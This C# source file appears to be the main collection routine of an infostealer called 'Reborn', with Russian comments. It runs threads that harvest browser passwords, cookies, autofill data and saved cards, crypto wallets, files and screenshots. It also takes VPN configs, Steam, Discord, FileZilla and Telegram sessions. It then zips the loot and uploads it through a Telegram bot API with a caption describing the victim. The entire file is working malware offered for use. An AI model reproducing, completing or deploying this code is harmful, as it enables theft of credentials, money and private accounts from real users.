using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Reborn
{
    class Collection
    {
        public static void Start()  // Метод вызова функций
        {
            try
            {
                Directory.CreateDirectory(Help.StealerDir);
                List<Thread> Threads = new List<Thread>();

                Threads.Add(new Thread(() => Report.CreateReport())); // Старт потока с браузерами

                Threads.Add(new Thread(() => Files.GetFiles())); // Старт потока с грабом файла

                Threads.Add(new Thread(() => StartWallets.Start())); // Старт потока c кошелями
                
                Threads.Add(new Thread(() =>
                {
                    Help.Ethernet(); // Получение информации о айпи
                    Screen.GetScreen(); // Скриншот экрана
                    ProcessList.WriteProcesses(); // Получение списка процессов
                    SystemInfo.GetSystem(); // Скриншот экрана
                }));

                Threads.Add(new Thread(() =>
                {
                    ProtonVPN.Save();
                    OpenVPN.Save();
                    NordVPN.Save();
                    Steam.SteamGet();
                }));

                Threads.Add(new Thread(() =>
                {
                    Discord.WriteDiscord();
                    FileZilla.GetFileZilla();
                    Telegram.GetTelegramSessions();
                    Vime.Get();
                }));

                foreach (Thread t in Threads)
                    t.Start();
                foreach (Thread t in Threads)
                    t.Join();

                // Пакуем в апхив с паролем
                string zipArchive = Help.StealerDir + "\\" + SystemInfo.CountryCode() + SystemInfo.IP() + "(" + Help.dateLog + ")" + ".zip";
                using (Ionic.Zip.ZipFile zip = new Ionic.Zip.ZipFile(Encoding.GetEncoding("cp866"))) // Устанавливаем кодировку
                {
                    zip.ParallelDeflateThreshold = -1;
                    zip.UseZip64WhenSaving = Ionic.Zip.Zip64Option.Always;
                    zip.CompressionLevel = Ionic.Zlib.CompressionLevel.Default; // Задаем степень сжатия 
                    zip.AddDirectory(Help.StealerDir); // Кладем в архив содержимое папки с логом
                    zip.Save(zipArchive); // Сохраняем архив    
                }
                string byteArchive = Path.GetFileName(zipArchive);
                byte[] file = File.ReadAllBytes(zipArchive);
                string url = string.Concat(new string[]
                    {

                    Help.ApiUrl,
                    Config.Token,
                    "/sendDocument?chat_id=",
                    Config.ID,
                    "&caption=" +
                     "\n👤 "+Environment.MachineName+"/" + Environment.UserName+
                     "\n🏴 IP: " + SystemInfo.IP() +  SystemInfo.Country() +
                     "\n BASIC INFORMATION:" +
                     "\n   ∟ Passwords - " +Counting.Passwords +
                     "\n   ∟ Cookies - " + Counting.Cookies +
                     "\n   ∟ History - " + Counting.History +
                     "\n   ∟ AutoFills - " + Counting.AutoFill +
                     "\n   ∟ Cards - " + Counting.CreditCards +
                     "\n   ∟ Grabbed Files - " + Counting.FileGrabber +
                     "\n OTHER SOFTWARE:" +
                     (Counting.Discord > 0 ? "\n   ✅  Discord" : "") +
                     (Counting.Wallets > 0 ? "\n   ✅  Wallets" : "") +
                     (Counting.Telegram > 0 ? "\n   ✅  Telegram" : "") +
                     (Counting.FileZilla > 0 ? "\n   ✅  FileZilla" + " ("+Counting.FileZilla+")" : "")+
                     (Counting.Steam > 0 ? "\n   ✅  Steam" : "") +
                     (Counting.NordVPN > 0 ? "\n   ✅  NordVPN" : "") +
                     (Counting.OpenVPN > 0 ? "\n   ✅  OpenVPN" : "") +
                     (Counting.ProtonVPN > 0 ? "\n   ✅  ProtonVPN" : "") +
                     (Counting.VimeWorld > 0 ? "\n   ✅  VimeWorld" + (Config.MinecraftModule == true ? $":\n     ∟ {Vime.Level()} {Vime.Donate()} {Vime.NickName()}" : ""):"") +
                     "\n⚙️ " + SystemInfo.GetSystemVersion() + 
                     "\n - " + URLSearcher.GetDomainDetect(Help.StealerDir + "\\Browsers\\")
                });
                if (Config.Developer)
                {
                    if (File.Exists(Help.AppDate + "\\Developer"))
                    {
                        MessageBox.Show("ВЫРУБИ РЕЖИМ РАЗРАБОТЧИКА И ПЕРЕКРЕСТИСЬ");
                        Application.Exit();
                        Environment.Exit(0);
                    }
                }
                Sending.POST(file, byteArchive, "application/x-ms-dos-executable", url);
            }
            catch (Exception e)
            {
                Console.WriteLine(e + "Чё то в коллектион");
            }
        }
    }
}
